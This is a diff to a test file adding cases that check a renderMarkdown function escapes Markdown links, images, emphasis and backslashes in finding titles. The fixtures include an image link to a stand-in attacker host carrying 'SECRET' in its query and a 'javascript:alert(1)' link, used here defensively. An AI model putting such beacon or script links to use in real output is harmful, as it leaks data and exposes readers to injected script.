@@ -85,6 +85,28 @@ describe("renderMarkdown", () => {
     expect(md).toContain("\\|");
   });
 
+  it("neutralises Markdown links, images and emphasis", () => {
+    const md = renderMarkdown(
+      dedupe([
+        finding({
+          title:
+            "![x](https://evil.example/t.png?d=SECRET) [click](javascript:alert(1)) *b* _i_ # h ~s~",
+        }),
+      ]),
+      meta,
+    );
+    expect(md).not.toMatch(/!\[x\]\(/);
+    expect(md).not.toMatch(/\[click\]\(/);
+    expect(md).toContain("\\!\\[x\\]\\(https://evil.example/t.png?d=SECRET\\)");
+    expect(md).toContain("\\*b\\*");
+    expect(md).toContain("\\_i\\_");
+  });
+
+  it("does not let a backslash undo the escaping", () => {
+    const md = renderMarkdown(dedupe([finding({ title: "a\\`b" })]), meta);
+    expect(md).toContain("a\\\\\\`b");
+  });
+
   it("states when there are no findings", () => {
     expect(renderMarkdown([], meta)).toMatch(/No findings/);
   });
